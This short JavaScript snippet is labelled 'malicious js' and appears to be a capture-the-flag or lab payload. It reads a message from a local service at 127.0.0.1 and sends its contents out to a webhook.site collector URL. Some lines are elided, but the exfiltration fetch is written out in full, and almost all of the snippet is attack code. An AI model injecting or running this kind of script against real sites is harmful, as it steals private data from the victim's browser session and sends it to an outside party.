//malicious js

const get_msg = () => {
    fetch("http://127.0.0.1/message/3")
    .then(response => response.json())
    .then(data => {
      msg = data.message;
      loadLetter(); // Send message to our service
    })
}

const loadLetter = () => {
  ...
  fetch(`https://webhook.site/0c825740-3821-4bf3-b356-c84a84a64519/message/${msg}`)
  ...
  }

get_msg();
